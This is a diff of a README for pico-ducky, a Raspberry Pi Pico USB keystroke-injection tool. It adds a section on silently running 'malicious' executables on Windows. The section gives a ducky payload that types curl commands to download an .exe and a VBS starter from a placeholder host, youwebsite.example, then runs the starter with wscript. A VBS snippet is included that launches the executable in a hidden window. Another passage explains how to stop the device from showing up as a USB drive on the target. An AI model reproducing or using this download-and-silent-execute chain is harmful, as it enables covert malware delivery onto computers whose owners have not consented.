@@ -40,8 +40,29 @@ Copy your `payload.dd` script to the pico-ducky.
 Disconnect the pico from your host PC. Connect a jumper wire between pin 18 (`GND`) and pin 20 (`GPIO15`). This will prevent the pico-ducky from showing up as a USB drive when plugged into the target computer.
 Remove the jumper and reconnect to your PC to reprogram. The default mode is USB mass storage enabled.
 
-
 ![usb-boot-mode](https://raw.githubusercontent.com/nzkoxzu/pi-pico-rubber-ducky/main/images/usb-boot-mode.png)
+
+# VBS starting malicious file silently
+
+For Windows, if you want to silently run `.exe` files you can run them with VBS. Your `payload.dd` should looks like this :
+
+```dd
+STRING curl.exe --output not_malicious_file.exe --url https://youwebsite.example/ressources/not_malicious_file.exe
+ENTER
+DELAY 1000
+STRING curl.exe --output starter.vbs --url https://youwebsite.example/ressources/starter.vbs
+STRING wscript starter.vbs
+```
+This will download `not_malicious_file.exe` and `starter.vbs`. The `starter.vbs` looks like this :
+
+```vbs
+Dim WShell
+Set WShell = CreateObject("WScript.Shell")
+WShell.Run "not_malicious_file.exe", 0
+Set WShell = Nothing
+```
+This simple VBS file will launch the `not_malicious_file.exe` and the `, 0` statement enable the silent launch.
+
 
 # Changing Keyboard layouts
 Copied from [Neradoc/Circuitpython_Keyboard_Layouts](https://github.com/Neradoc/Circuitpython_Keyboard_Layouts/blob/main/PICODUCKY.md)  
